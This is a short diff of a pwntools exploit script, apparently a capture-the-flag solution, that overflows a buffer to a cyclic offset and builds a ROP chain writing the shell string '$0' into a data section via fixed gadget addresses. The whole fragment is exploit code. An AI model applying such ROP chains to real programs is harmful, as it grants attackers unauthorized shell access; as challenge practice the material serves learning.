@@ -87,17 +87,17 @@ continue
 io = start()
 
 payload = '\x90' * cyclic_find('laaa')
-command = '${0}'
+command = '$0'
 
 DATA_START = 0x804a038
 
-## gadgets to write datas
+## gadgets for write datas
 POP_ESI_POP_EDI = 0x08048899
 MOV_EDI_ESI = 0x08048893
 
 rop = ROP(exe)
 rop.raw(POP_ESI_POP_EDI)
-rop.raw(command)
+rop.raw(command.ljust(4, '\x00'))
 rop.raw(DATA_START)
 rop.raw(MOV_EDI_ESI)
 
